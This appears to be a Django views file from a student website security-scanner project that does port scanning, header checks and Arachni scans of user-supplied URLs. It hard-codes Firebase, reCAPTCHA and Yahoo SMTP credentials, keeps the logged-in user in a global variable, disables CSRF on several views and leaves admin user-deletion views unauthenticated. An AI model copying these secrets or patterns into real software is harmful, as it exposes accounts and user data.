from django.shortcuts import render
from subprocess import run,PIPE
import subprocess
import requests
import sys
from django.views.decorators.csrf import csrf_exempt
from django.template import RequestContext
from django.http import HttpResponse
import socket
import subprocess
import os
import pathlib
from collections import OrderedDict
import urllib
import json
import random
import time
import mechanize
import http.cookiejar as cookielib
from bs4 import BeautifulSoup,SoupStrainer
import html2text
import re
import requests 
import dropbox
from datetime import datetime, date
import lxml.html
from django.contrib.auth.decorators import login_required
from .headercheck import SecurityHeaders
from myapp.securityheaders.__main__ import cli
from myapp.arachni_tester import ArachniClient
from urllib.parse import urlparse
import urllib.request
from urllib import parse
from django.shortcuts import render, redirect
from django.contrib.auth import (
    authenticate,
    get_user_model,
    login,
    logout
)
from django.contrib.auth.models import User
from .forms import UserLoginForm, UserRegisterForm
import pyrebase 
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.application import MIMEApplication
from email.mime.image import MIMEImage
from email import encoders
from myapp.emailer import thisonetrust
import firebase_admin
from firebase_admin import credentials
from django.template import Template, Context
from firebase_admin import auth as auth2
from myapp.pdf_generator import pdf_generator
from myapp.otpyer import qrcodeGenerator, validation

config={
    "apiKey": "AIzaSyARTOEGZOikzGrk6f0jSkhCiXBx2FAKg78",
    "authDomain": "fyptheboyes.firebaseapp.com",
    "databaseURL": "https://fyptheboyes.firebaseio.com",
    "projectId": "fyptheboyes",
    "storageBucket": "fyptheboyes.appspot.com",
    "messagingSenderId": "1073113067983",
    "appId": "1:1073113067983:web:7564efc27471e46f65e2ba",
    "measurementId": "G-R0SJYKDBMZ",
    
}
firebase=pyrebase.initialize_app(config)
db=firebase.database()
auth=firebase.auth()

cred=credentials.Certificate('./mysite/myapp/firebasesdk.json')
app=firebase_admin.initialize_app(cred, {
    "databaseURL": "https://fyptheboyes.firebaseio.com",
})

login_email_rn=""



def error_404_view(request,exception):
    return render(request,'404.html')

def error_505_view(request,exception):
    return render(request,'500.html')
#----------------------------------------------
def signIn(request):
 
    return render(request, "login.html")


def postsign(request):
    global login_email_rn
    email=request.POST.get('email')
    passw=request.POST.get('pass')
    otpcode=request.POST.get('code')
    
    captcha_token=request.POST.get('g-recaptcha-response')
    captcha_url='https://www.google.com/recaptcha/api/siteverify'
    captcha_secret='6Le9FpEaAAAAAPPu0sot1fAVj4n31mharnfEdrLt'
    cap_data={"secret":captcha_secret, "response":captcha_token}
    cap_server_response=requests.post(url=captcha_url, data=cap_data)
    cap_json=json.loads(cap_server_response.text)
    print(cap_json)
    try:
        user = authenticate(request,username=email, password=passw)
        check_email = auth2.get_user_by_email(email)
        
        user_check_fb=auth.sign_in_with_email_and_password(email,passw)
        usercheckfb = auth.get_account_info(user_check_fb['idToken'])
        usercheckjson=json.dumps(usercheckfb['users'])
        userjsonload=json.loads(usercheckjson)
    except:
        message="Invalid login details. Try again."
        return render(request,"login.html", {"msgg":message}) 
   
  
    if user is not None and check_email.uid is not None and otpcode is not None:
        
        if cap_json['success']==False:
            message="Invalid captcha, try again!"
            return render(request,"login.html", {"msgg":message})
            
        elif check_email.email_verified == False:
            message="Please verify your email before login!"
            return render(request,"login.html", {"msgg":message})

        else:
            
            if otpcode is not None:
               
                secret=db.child(email.replace(".","_")).child("secret").get()
              
                print(secret.val())
                
                otp_check=validation(secret.val(), otpcode)
                print("printing otp check")
                print(otp_check)
                if otp_check == True:
                    #login the user and save session :D
                    login(request, user)
                    
                    # ----------------------------------------
                    now = datetime.now()
                    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
                    email_address = email    # add email address here
                    Subject = 'Did you log in?\n\n'
                    content = 'Hi there, we detected a login from your account on '+dt_string+'. If this is not you kindly contact us ASAP and we will assist you.\n\n' 
                    footer = '- TheBoyes Administrator'    # add test footer 
                    passcode = 'blfmslewrtijnfqn'        # add passcode here
                    conn = smtplib.SMTP_SSL('smtp.mail.yahoo.com', 465) 
                    conn.ehlo()
                    conn.login('fypemail@yahoo.com', passcode)
                    conn.sendmail('fypemail@yahoo.com',email_address,Subject + content + footer)
                    conn.quit()
                    
                    login_email_rn=str(email)
                    # -----------------------------------------------------
                    scan_check_get=db.child(login_email_rn.replace(".","_")).child("scan_check").get()#only when login
                
                    scan_check=scan_check_get.val()
                    return render(request,"pick.html",{"firebasename":check_email.display_name,"scan_check":scan_check}) 

                else:
                    message="OTP invalid!"
                    return render(request,"login.html", {"msgg":message}) 
            else:
                message="Please key in OTP!"
                return render(request,"login.html", {"msgg":message})   
    else:
        message="Invalid login details. Try again."
        return render(request,"login.html", {"msgg":message}) 
    

def postregister(request):
    regem=request.POST.get('reg_email')
    regpass=request.POST.get('reg_password')
    regname=request.POST.get('reg_name')


    if User.objects.filter(username=regem).exists():
        message="User Exists!"

        return render(request,'userreg.html', {"msgg":message})
    else:

        saveuser=User.objects.create_user(username=regem,password=regpass)
        saveuser.save()
        user=auth.create_user_with_email_and_password(regem, regpass)

        signin = auth.sign_in_with_email_and_password(regem, regpass)
        auth.send_email_verification(signin['idToken'])
        time.sleep(2)
        user = auth2.get_user_by_email(regem)
            
        user_update=auth2.update_user(user.uid, display_name=str(regname))
        message="Email Verification Has Been Sent"

        #saving otp secret to firebase
        secretcode=qrcodeGenerator(regem)
        #==========QR CODE SEND TO EMAIL=======
        try:
            msg = MIMEMultipart()
            attachment ="./mysite/myapp/QRcodes/{0}.jpg'.format(regem) 
            msg['Subject'] = 'Your QR Code - TheBoyes Web Scanner'
            msg['From'] = 'fypemail@yahoo.com' #change this to email used by us
            msg['To'] = regem #change this to email input from user
            # Add body to email
            msgText = MIMEText('<b>Hi there!</b><br><p>Please scan the QR code attached with this email with Google Authenticator to be able to get your code during login</p><br><p>Google Authenticator for Android:<a>https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2</a></p><br><p>Google Authenticator for iOS:<a>https://apps.apple.com/us/app/google-authenticator/id388497605</a></p><img src="cid:attachment">', 'html')  
            msg.attach(msgText)   # Added, and edited the previous line
        
            fp = open(attachment, 'rb')                                                    
            img = MIMEImage(fp.read())
            fp.close()
            img.add_header('Content-ID', '<{}>'.format(attachment))
            msg.attach(img)
        
            # Create SMTP object
            session = smtplib.SMTP('smtp.mail.yahoo.com', 587)
            session.starttls() #enable security
            # Login to the server
            session.login('fypemail@yahoo.com', 'driqnfsefylmmlwq')

            # Convert the message to a string and send it
            session.sendmail(msg['From'], msg['To'], msg.as_string())
   
            print("Mail sent")
        except:
            print("issue")


        #========================================
        print(secretcode)
        secret_to_firebase = db.child(regem.replace(".","_")).child("secret")
        secret_to_firebase.set(secretcode)
        return render(request,'userreg.html', {"msgg":message})
@login_required
def profile(request):
    
    check_email = auth2.get_user_by_email(login_email_rn)
    
    return render(request,'profile.html',{"firebasename":check_email.display_name,"emel":login_email_rn})
@login_required
def profile_update(request):
    check=request.POST.get('resetemail')
    pass1=request.POST.get('respass')
    pass2=request.POST.get('respassconf')
    print(check,pass1,pass2)
    if len(str(pass1))>=6:
        print(len(str(pass1)))
        if str(pass1) == str(pass2):
            u=User.objects.get(username=check)
            
            
            u.set_password(pass1)
            u.save()
            print(u.is_active)
            user = auth2.get_user_by_email(check)
            print(user.uid)
            user_update=auth2.update_user(user.uid, password=str(pass1))
            
            mesg="Password updated successfully."
            return render(request, 'profile.html',{"msgg":mesg})
        else:
            print("it passed here2")

            mesg="Password error. Check input!"
            return render(request, 'profile.html',{"msgg":mesg})
    else:
        print("it passed here2")

        mesg="Password must be above 6 characters long!"
        return render(request, 'profile.html',{"msgg":mesg})
    

    
def logout_view(request):
    global login_email_rn
    login_email_rn=""
    logout(request)
    return redirect('/')

@login_required
def home(request):
    print(login_email_rn)
    scan_check_get=db.child(login_email_rn.replace(".","_")).child("scan_check").get()#only when login
    
    scan_check=scan_check_get.val()
    check_email = auth2.get_user_by_email(login_email_rn)
    return render(request,'pick.html',{"firebasename":check_email.display_name,"scan_check":scan_check})
    
#put three button, disable done, noe enable and delete
def del_disble_user(request):
    email_to_disable=request.POST.get('disble_user_button')
    email_to_delete=request.POST.get('del_user_button')
    print(email_to_delete)
    print(email_to_disable)
    if email_to_disable is not None:
        u=User.objects.get(username=email_to_disable)

        print(u.is_active)
        if u.is_active == False:
            u.is_active = True
            u.save()
            
            print(email_to_disable)
        
            user = auth2.get_user_by_email(email_to_disable)
            user_update=auth2.update_user(user.uid, disabled=False)
        
        else:
            u.is_active = True
            u.is_active = False
            u.save()
        
            print(email_to_disable)
    
            user = auth2.get_user_by_email(email_to_disable)
            user_update=auth2.update_user(user.uid, disabled=True)
            # auth2.delete_user(user.uid)
            
        print("User disabled/enabled!")
    
    elif email_to_delete is not None:
        try:
            u=User.objects.get(username=email_to_delete)
            u.username = "delete"+datetime.today().strftime('%d%m%Y%H%M%S')
            u.save()
        except User.DoesNotExist:
            messages.error(request, "User doesnot exist")  
        user = auth2.get_user_by_email(email_to_delete)
        auth2.delete_user(user.uid)
         
     
        print("User gone!")


    return admin_custom(request)

def admin_custom(request):
    g=[]
    ver=""
    disabled=""
    today=datetime.today().strftime('%d-%m-%Y')
    
    page = auth2.list_users()
    while page:
        for user in page.users:
            # print('User: ' + user)
            if user.email_verified == True:
                ver="Verified"
            else:
                ver="Not Verified"
            usermeta=auth2.get_user(user.uid)
            disbled=user.disabled
            if disbled==False:
                disabled="Active"
            else:
                disabled="Disabled"
            createtime=usermeta.user_metadata.creation_timestamp
            lastlogin=usermeta.user_metadata.last_sign_in_timestamp
            formtd_time_create=time.strftime('%d-%m-%Y %H:%M:%S', time.localtime(createtime/1000.0))
            formtd_time_lastlogin=time.strftime('%d-%m-%Y %H:%M:%S', time.localtime(lastlogin/1000.0))
            #change to disable/enable..and add the delete button

            #^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
            disable_button='<button type="submit" class="btn btn-primary" name="disble_user_button" value={0}>Enable/Disable</button>'.format(user.email)
            delete_button='<button type="submit" class="btn btn-primary" name="del_user_button" value={0}>Delete</button>'.format(user.email)

            g.append([user.email,ver,disabled,formtd_time_create,formtd_time_lastlogin,disable_button,delete_button])
        
        page = page.get_next_page()
    
    return render(request,'template.html', {"extractuser":list(g),"today":today})

@login_required    
def scan_history(request):

    history=[]
    scan_date=[]
    dload=[]
    login_email_rn="fypemail@yahoo.com"
    emel=login_email_rn.replace(".","_")
    print(emel)
    
    extract_scan_history = db.child(emel).child("scans").get()
    print("printing random stuff")
    print(extract_scan_history)
    
    for scanned in extract_scan_history:
        print(scanned.key())
        keys=scanned.key()
        web_extract=keys.replace("_",".")
        strip_character="."
  
        url_extract=web_extract[:-15]
        # datee=strip_character.join(web_extract.split(strip_character)[2:])
        dateee=web_extract[-14:]
        
        date_formatted=datetime.strptime(dateee, '%d%m%Y%H%M%S')
    
        history.append(url_extract)
        scan_date.append(date_formatted)
        
        
        dload_button=Template(
            f'<form  action="{{% url \'historyreport\' %}}" method="post"><button type="submit" name="dload_scan" value="{scanned.key()}" class="btn btn-primary" name="dload_scan" value="{scanned.key()}">View</button></form>'
            ).render(Context())
        print(dload_button)
        dload.append(dload_button)
        
        ziplist=zip(history, scan_date,dload)
    print(dload)
    # return render(request,'scan_history.html', {"scanHistory":ziplist,"dload_button":dload_button})
    return render(request,'scan_history.html', {"scanHistory":ziplist,"dlojad":dload})

# #@login_required(login_url='/admin_log_in/')
def admin_reg(request):
    return render(request,'userreg.html')



def admin_login(request):
    
    return render(request,'admin_login.html')

def admin_process_log(request):
    adm_mail=request.POST.get('admin_uname')
    adm_password=request.POST.get('admin_pass')
   
    if str(adm_mail) == 'fypemail@yahoo.com':
       
        try:
            user=auth.sign_in_with_email_and_password(adm_mail, adm_password)
        except:
            message="Check input! Try again."
            return render(request,"admin_login.html", {"msgg":message})
    else:
        message="Not an admin! Try again."
        return render(request,"admin_login.html", {"msgg":message})
    return redirect('admin_custom')

def logout_admin(request):
    logout(request)
    return redirect('/admin-login/')
    


@login_required
@csrf_exempt
def report(request):
  
    keys=[]
    descr=[]
    remedy=[]
    url_issue=[]
    emel=login_email_rn.replace(".","_")
    extract = db.child(emel).child("scans").child(thewebsite).get()

    for x in extract.each():

        keys.append(x.key())
        descr.append(x.val()['description'])
        remedy.append(x.val()['remedy'])
        url_issue.append(x.val()['url_issue'])
  
    
    return render(request,'report.html',{"keysNvalue":zip(keys,descr,remedy,url_issue)})

@login_required
def normal(request):
    scan_check_get=db.child(login_email_rn.replace(".","_")).child("scan_check").get()#only when login
    
    scan_check=scan_check_get.val()
    return render(request,'normal.html',{"scan_check":scan_check})    

@login_required
def fullscan_arachni(request):
    return render(request,'fullarachni.html') 

@login_required
def fullscan_arachni_auth(request):
    return render(request,'fullarachni_auth.html') 

@login_required
def index(request):
    return render(request,'index.html')



@login_required
@csrf_exempt
def norm_scan(request):
    
    remoteServer= request.POST.get('param')
    url_inp=""
    emailtofirebase=login_email_rn.replace(".","_")
    db.child(emailtofirebase.replace(".","_")).child("scan_check").set(1)
    try:
               
        urller = re.compile(r"https?://(www\.)?")
        new=urller.sub('', remoteServer).strip().strip('/')
        split_string = new.split("/", 1)
        url_inp = split_string[0]
    except:
        pass
    print(url_inp)
    
    remoteServerIP  = socket.gethostbyname(url_inp)
    com_port = [20, 21, 22, 23, 25, 50, 51, 53, 67, 68, 69, 80, 110, 119, 123, 135,136, 137, 138, 139, 143, 161, 162, 179, 389, 443, 636, 989, 990, 993, 1812]
    portOpenList = []
    portCloseList = []

    
    #out=run([sys.executable, 'D://Desktop//quanta//QuantaDjango//quanta_Scanner//mysite//myapp//tester.py',inp], shell=False)
    try:
        for port in com_port:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.8)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                portOpenList.append(port)
                print("Port {}: 	 Open".format(port))

            else:
                portCloseList.append(port)
                print("Port {}:          Closed".format(port))
            sock.close()

    except KeyboardInterrupt:
        print("Keyboard Interrupt")
    fixed_list=str(portOpenList)[1:-1]
 
    print ("ip: ",remoteServer , "portsOpen: ", fixed_list)
    
    ip_locate=urllib.request.urlopen("http://ip-api.com/json/"+url_inp)
    data=ip_locate.read()
    values=json.loads(data)
    val=values['lat']
    val2=values['lon']
    

    scoring=31-len(fixed_list)
    
    #----------------------------------------------
    
    foo = SecurityHeaders()

    parsed = urlparse(remoteServer)
    if not parsed.scheme:
        url = 'http://' + remoteServer # default to http if scheme not provided


    headers = foo.check_headers(url)

    if not headers:
        print ("Failed to fetch headers, exiting...")
   

    okColor = '\033[92m'
    warnColor = '\033[93m'
    endColor = '\033[0m'
    
    for header, value in headers.items():
        if value['warn'] == 1:
            if value['defined'] == False:
                print('Header \'' + header + '\' is missing ... [ ' + warnColor + 'WARN' + endColor + ' ]')
                
            else:
                print('Header \'' + header + '\' contains value \'' + value['contents'] + '\'' + \
                    ' ... [ ' + warnColor + 'WARN' + endColor + ' ]')
                scoring=scoring+1
        elif value['warn'] == 0:
            if value['defined'] == False:
                print('Header \'' + header + '\' is missing ... [ ' + okColor + 'OK' + endColor +' ]')
                
            else:
                print('Header \'' + header + '\' contains value \'' + value['contents'] + '\'' + \
                    ' ... [ ' + okColor + 'OK' + endColor + ' ]')
                scoring=scoring+1

    https = foo.test_https(url)
    if https['supported']:
        print('HTTPS supported ... [ ' + okColor + 'OK' + endColor + ' ]')
        scoring=scoring+1
    else:
        print('HTTPS supported ... [ ' + warnColor + 'FAIL' + endColor + ' ]')
        

    if https['certvalid']:
        print('HTTPS valid certificate ... [ ' + okColor + 'OK' + endColor + ' ]')
        scoring=scoring+1
    else:
        print('HTTPS valid certificate ... [ ' + warnColor + 'FAIL' + endColor + ' ]')
        


    if foo.test_http_to_https(url, 5):
        print('HTTP -> HTTPS redirect ... [ ' + okColor + 'OK' + endColor + ' ]')
        scoring=scoring+1
    else:
        print('HTTP -> HTTPS redirect ... [ ' + warnColor + 'FAIL' + endColor + ' ]')

   
    # -------------------------------------------
    cli(url)
    

                
    visited_links=[]
    page = requests.get(url)    
    data = page.text
    soup = BeautifulSoup(data, features = "lxml")
    linkfinder=soup.find_all('a')
    print(linkfinder)
    if not linkfinder:
        print("None")
        visited_links.append("None") 
    else:
        for link in soup.find_all('a'):
            print(link.get('href'))
            visited_links.append(link.get('href')) 
        
    print(visited_links)
    
        # -------------------------------------------------------------------
 
    
 
    # a=render(request, 'report.html',{'data':fixed_list,'data2':c,'data3':val,'data4':val2, 'data5':list(visited_links), 'data6':cj,"keysNvalue":zip(keys,descr,remedy,url_issue)})
    now_today=datetime.now().strftime("%d%m%Y%H%M%S")
    
    url_tofirebase=url_inp.replace(".","_")+"_"+now_today
    
    
    #sending to firebase
    to_firebase={"ip":remoteServer,"port_open":fixed_list, "ip_info":values, "sitemap":visited_links,"head_found":headers}
    db.child(emailtofirebase).child("scans").child(url_tofirebase).set(to_firebase)
    to_firebase23={"issues":"Issues listed above."}
    db.child(emailtofirebase).child("scans").child(url_tofirebase).child("issues").update(to_firebase23) 
   
    pdf_generator(url_tofirebase,emailtofirebase)
    time.sleep(5)
    keys=[]
    descr=[]
    remedy=[]
    url_issue=[]

    extract = db.child(emailtofirebase).child("scans").child(url_tofirebase).child("head_found").get()
    

    for x in extract.each():
        print(x.key())
        if len(x.val())==3:

            keys.append(x.key())
            descr.append(x.val()['contents'])
            remedy.append(x.val()['defined'])
            url_issue.append(remoteServer)

           
            
        else:
            keys.append(x.key())
            descr.append(x.val()['defined'])
            remedy.append(x.val()['discription'])
            url_issue.append(remoteServer)

    c=(scoring/36)*100
    tole_firebase={"z_scor":c,"z_lat":val,"z_long":val2}
    db.child(emailtofirebase).child("scans").child(url_tofirebase).update(tole_firebase)
    db.child(emailtofirebase.replace(".","_")).child("scan_check").set(0)
    return render(request, 'report.html',{'data':fixed_list,'data2':round(c),'data3':val,'data4':val2, 'data5':list(set(visited_links)),"keysNvalue":zip(keys,descr,remedy,url_issue)})
  


@login_required
@csrf_exempt    
def arachni (request):
    
    url = request.POST.get('param')
    email=request.POST.get('userinputemail')
    db.child(email.replace(".","_")).child("scan_check").set(1)
    url_inp=""
    try:
               
        urller = re.compile(r"https?://(www\.)?")
        new=urller.sub('', url).strip().strip('/')
        split_string = new.split("/", 1)
        url_inp = split_string[0]
    except:
        pass
    print(url_inp)
    
    # split_url = parse.urlsplit(url_inp)
    # remoteServerIP = socket.gethostbyname(split_url.netloc)
    remoteServerIP  = socket.gethostbyname(url_inp)
    print(remoteServerIP)
    com_port = [20, 21, 22, 23, 25, 50, 51, 53, 67, 68, 69, 80, 110, 119, 123, 135,136, 137, 138, 139, 143, 161, 162, 179, 389, 443, 636, 989, 990, 993, 1812]
    portOpenList = []
    portCloseList = []
    #out=run([sys.executable, 'D://Desktop//quanta//QuantaDjango//quanta_Scanner//mysite//myapp//tester.py',inp], shell=False)
    try:
        for port in com_port:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                portOpenList.append(port)
                print("Port {}: 	 Open".format(port))

            else:
                portCloseList.append(port)
                print("Port {}:          Closed".format(port))
            sock.close()

    except KeyboardInterrupt:
        print("Keyboard Interrupt")
    fixed_list=str(portOpenList)[1:-1]
 
    print ("ip: ",url , "portsOpen: ", fixed_list)
    
    ip_locate=urllib.request.urlopen("http://ip-api.com/json/"+url_inp)
    data=ip_locate.read()
    values=json.loads(data)
    print(values)
    val=values['lat']
    val2=values['lon']
    

    scoring=31-len(fixed_list)
    #----------------------------------------------
     #sending to firebase
    

    foo = SecurityHeaders()

    # parsed = urlparse(url)
    # if not parsed.scheme:
    #     url = 'http://' + url # defasult to http if scheme not provided


    headers = foo.check_headers(url_inp)

    if not headers:
        print ("Failed to fetch headers, exiting...")
        sys.exit(1)

    okColor = '\033[92m'
    warnColor = '\033[93m'
    endColor = '\033[0m'
    
    for header, value in headers.items():
        if value['warn'] == 1:
            if value['defined'] == False:
                print('Header \'' + header + '\' is missing ... [ ' + warnColor + 'WARN' + endColor + ' ]')
            else:
                print('Header \'' + header + '\' contains value \'' + value['contents'] + '\'' + \
                    ' ... [ ' + warnColor + 'WARN' + endColor + ' ]')
                scoring=scoring+1
        elif value['warn'] == 0:
            if value['defined'] == False:
                print('Header \'' + header + '\' is missing ... [ ' + okColor + 'OK' + endColor +' ]')
            else:
                print('Header \'' + header + '\' contains value \'' + value['contents'] + '\'' + \
                    ' ... [ ' + okColor + 'OK' + endColor + ' ]')
                scoring=scoring+1

    https = foo.test_https(url)
    if https['supported']:
        print('HTTPS supported ... [ ' + okColor + 'OK' + endColor + ' ]')
        scoring=scoring+1
    else:
        print('HTTPS supported ... [ ' + warnColor + 'FAIL' + endColor + ' ]')

    if https['certvalid']:
        print('HTTPS valid certificate ... [ ' + okColor + 'OK' + endColor + ' ]')
        scoring=scoring+1
    else:
        print('HTTPS valid certificate ... [ ' + warnColor + 'FAIL' + endColor + ' ]')


    if foo.test_http_to_https(url, 5):
        print('HTTP -> HTTPS redirect ... [ ' + okColor + 'OK' + endColor + ' ]')
        scoring=scoring+1
        if not re.match('(?:http|https)://', url):
            url='https://{}'.format(url_inp)
        else:
            pass
    else:
        print('HTTP -> HTTPS redirect ... [ ' + warnColor + 'FAIL' + endColor + ' ]')
        if not re.match('(?:http|https)://', url):
            url='http://{}'.format(url_inp)
        else:
            pass
   
    

    # if not re.match('(?:http|https)://', url):
    #     url='https://{}'.format(url)
    # else:
    #     pass
    
    print(url)
    p=subprocess.Popen([r'.\mysite\myapp\arachni-1.5.1-0.5.12-windows-x86_64\bin\arachni_rest_server.bat'])
    time.sleep(20)
    a = ArachniClient()
    resumeFlag = False
    authFlag = False
    scanType = ""
    
    #checks for existing scans and resumes from there instead
    avail_scan_object = a.get_scans() #returns json object of available scans
    print(a.get_scans()) #displays available scans | testing only

    for x in avail_scan_object: #check if avail scan is ongoing
        status_object = a.get_status(x)
        if(status_object["busy"] == True): #break and resume last scan if scan is still ongoing
            scan_ID = x
            resumeFlag = True
            start_time = time.time()
            break
    
    if(resumeFlag == False):
      
        checkAuth="n"
        while checkAuth not in ("y","n"):
            print("Invalid input")
          
            checkAuth = input("Do you want to perform an Authenticated Scan? (y/n): ")

    #select scan type here then ask if user would like to use authenticated scanning

    #start new scan if there are no ongoing ones
    if(resumeFlag == False and checkAuth == "n"):
        print("Normal scan")

        checkNormalScanType = int(request.POST.get("scanType"))

        while checkNormalScanType not in [1,2,3,4]:
            print("Invalid input")
         
            checkNormalScanType = input("Please select a scan type [1 - full audit, 2 - xss, 3 - sql, 4 - server]: ")
        scanType = a.selectNormalScan(checkNormalScanType)
        print(scanType)
        try:
            a.target(url)
            scan_json_object = a.start_scan() #outputs json dictionary
            scan_ID = scan_json_object["id"]
            start_time = time.time()
        except Exception as e:
            print(e)

    #start auth scan if user chose yes
    elif(resumeFlag == False and checkAuth == "y"):
        authFlag = True
        checkAuthScanType = int(input("Please select a scan type [1 - full audit, 2 - xss, 3 - sql, 4 - server]: "))
        while checkAuthScanType not in [1,2,3,4]:
            print("Invalid input")
           
            checkAuthScanType = input("Please select a scan type [1 - full audit, 2 - xss, 3 - sql, 4 - server]: ")
        print("Authenticated scan")
        scanType = a.selectAuthScan(checkAuthScanType)
        scan_json_object = a.start_scan() #outputs json dictionary
        scan_ID = scan_json_object["id"]
        start_time = time.time()

    print("passes")
    scanflag=True
    while scanflag is True:
    
        print("Resumed scan? | ", resumeFlag)
        print("Authenticated? | ", authFlag)
        print("The scan is ongoing...")
        
        status_object = a.get_status(scan_ID)
        print("Current page is: ", status_object["statistics"]["current_page"])
        print("Total audited pages are: ", status_object["statistics"]["audited_pages"])
        print("Total found pages are: ", status_object["statistics"]["found_pages"])
        print("Elapsed time is: ", status_object["statistics"]["runtime"])
        print("Current status is: ", status_object["status"])
        print("Current busy flag is: ", status_object["busy"])

        if(status_object["busy"] == False):
            print("Total scan time: ", status_object["statistics"]["runtime"])
            print("Scan has been completed, retrieving report...")
            a.getScanReport(scan_ID,"json") #output to json for database processing
            a.getScanReport(scan_ID,"html") #output to html for user ease of interaction
            # a.processJSON(scan_ID) #print out choice information
            scanflag=False
        
            time.sleep(10)
            fixed_scan_Id=scan_ID[:20]
            a.delete_scan(scan_ID)
            print("testpass")
            

            
            
            tofirebase={"ip":url_inp,"port_open":fixed_list, "ip_info":values, "head_found":headers}
           
            emailtofirebase=login_email_rn.replace(".","_")

            now_today=datetime.now().strftime("%d%m%Y%H%M%S")
           
            url_tofirebase=url_inp.replace(".","_")+"_"+now_today
          
            print(url_tofirebase)
            db.child(emailtofirebase).child("scans").child(url_tofirebase).set(tofirebase) 
            
            
            try:
                with open("myapp/reports/"+fixed_scan_Id+ ".json", encoding="utf-8") as jsonfile:
                    json_obj = json.load(jsonfile)
                    print(json_obj['issues'])
                    try:
                        if json_obj['issues'] !=[]:
                            for x in json_obj['issues']:
                                
                                if x['name']=="Interesting response":
                                    to_firebase={"issues":x['name'],"description":x['description']}
                                    db.child(emailtofirebase).child("scans").child(url_tofirebase).child("issues").child(x['name']).set(to_firebase)
                                else:
                                    to_firebase={"issues":x['name'],"description":x['description'],"remedy":x['remedy_guidance'],"url_issue":x['vector']['url']}
                                    db.child(emailtofirebase).child("scans").child(url_tofirebase).child("issues").child(x['name']).set(to_firebase)
                        
                            
                        else:
           

                            to_firebase={"issues":"None"}
                            db.child(emailtofirebase).child("scans").child(url_tofirebase).child("issues").update(to_firebase) 

                        count=0
                        if json_obj['sitemap'] is not None:
                            
                            for xy in json_obj['sitemap']: 
                                count+=1 
                                
                                nummm=str(json_obj['sitemap'][xy])   
                                to_f={count:xy}                    
                                db.child(emailtofirebase).child("scans").child(url_tofirebase).child("sitemap").update(to_f)

                    except Exception as e:
                        print(e)

            except:
                print("File not found!")
            scanflag=False
      

    #the pdf generator is here
   
    pdf_generator(url_tofirebase,emailtofirebase)
    p.kill()
    
    keys=[]
    descr=[]
    remedy=[]
    url_issue=[]
    emel=login_email_rn.replace(".","_")
    extract = db.child(emel).child("scans").child(url_tofirebase).child("issues").get()
    

    for x in extract.each():
        if x.key()=="issues":
            keys.append("None")
            descr.append("None")
            remedy.append("None")
            url_issue.append("None")
            

        else:
            keys.append(x.key())
            descr.append(x.val()['description'])
            remedy.append(x.val()['remedy'])
            url_issue.append(x.val()['url_issue'])

    visited_links=[]
    extract_sitemap= db.child(emel).child("scans").child(url_tofirebase).child("sitemap").get()
    for x in extract_sitemap.each():
        visited_links.append(x.val())
    thisonetrust(fixed_scan_Id,email,re.sub('[.:/]','_',url),url_tofirebase)
     

    c=(scoring/36)*100
    tole_firebase={"z_scor":c,"z_lat":val,"z_long":val2}
    db.child(emailtofirebase).child("scans").child(url_tofirebase).update(tole_firebase)
    db.child(emailtofirebase).child("scan_check").set(1)
    return render(request, 'report.html',{'data':fixed_list,'data2':round(c),'data3':val,'data4':val2, 'data5':list(set(visited_links)),"urlfirebase":url_inp,"keysNvalue":zip(keys,descr,remedy,url_issue)})

@login_required
@csrf_exempt
def scan_history_report(request):  
    web_history=request.POST.get('dload_scan')
    print(web_history)
    
    
    keys=[]
    descr=[]
    remedy=[]
    url_issue=[]
    emel=login_email_rn.replace(".","_")
   

    extract = db.child(emel).child("scans").child(web_history).child("issues").get()
    

    for x in extract.each():
        if x.key()=="issues":
            keys.append("None")
            descr.append("None")
            remedy.append("None")
            url_issue.append("None")
            

        else:
            keys.append(x.key())
            descr.append(x.val()['description'])
            remedy.append(x.val()['remedy'])
            url_issue.append(x.val()['url_issue'])

    visited_links=[]
    extract_sitemap= db.child(emel).child("scans").child(web_history).child("sitemap").get()
    val=db.child(emel).child("scans").child(web_history).child("z_lat").get().val()
    val2=db.child(emel).child("scans").child(web_history).child("z_long").get().val()
    print(val)
    print(extract_sitemap)
    c=db.child(emel).child("scans").child(web_history).child("z_scor").get().val()
   
    print(db.child(emel).child("scans").child(web_history).child("port_open").get().val())

    fixed_list=db.child(emel).child("scans").child(web_history).child("port_open").get().val()
    for x in extract_sitemap.each():
        visited_links.append(x.val())

    return render(request, 'report.html',{'data':fixed_list,'data2':round(c),'data3':val,'data4':val2, 'data5':list(set(visited_links)),"keysNvalue":zip(keys,descr,remedy,url_issue)})

@login_required
@csrf_exempt    
def arachni_auth (request):
    

    url = request.POST.get('param')
    username = request.POST.get('userInp')
    password = request.POST.get('passInp')
    usernameinp = request.POST.get('form_cred_user')
    passwordinp = request.POST.get('form_cred_pass')
    db.child(login_email_rn.replace(".","_")).child("scan_check").set(1)
    url_inp=""
    try:
               
        urller = re.compile(r"https?://(www\.)?")
        new=urller.sub('', url).strip().strip('/')
        split_string = new.split("/", 1)
        url_inp = split_string[0]
    except:
        pass
    print(url_inp)
    
    # split_url = parse.urlsplit(url_inp)
    # remoteServerIP = socket.gethostbyname(split_url.netloc)
    remoteServerIP  = socket.gethostbyname(url_inp)
    print(remoteServerIP)
    com_port = [20, 21, 22, 23, 25, 50, 51, 53, 67, 68, 69, 80, 110, 119, 123, 135,136, 137, 138, 139, 143, 161, 162, 179, 389, 443, 636, 989, 990, 993, 1812]
    portOpenList = []
    portCloseList = []
    #out=run([sys.executable, 'D://Desktop//quanta//QuantaDjango//quanta_Scanner//mysite//myapp//tester.py',inp], shell=False)
    try:
        for port in com_port:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                portOpenList.append(port)
                print("Port {}: 	 Open".format(port))

            else:
                portCloseList.append(port)
                print("Port {}:          Closed".format(port))
            sock.close()

    except KeyboardInterrupt:
        print("Keyboard Interrupt")
    fixed_list=str(portOpenList)[1:-1]
 
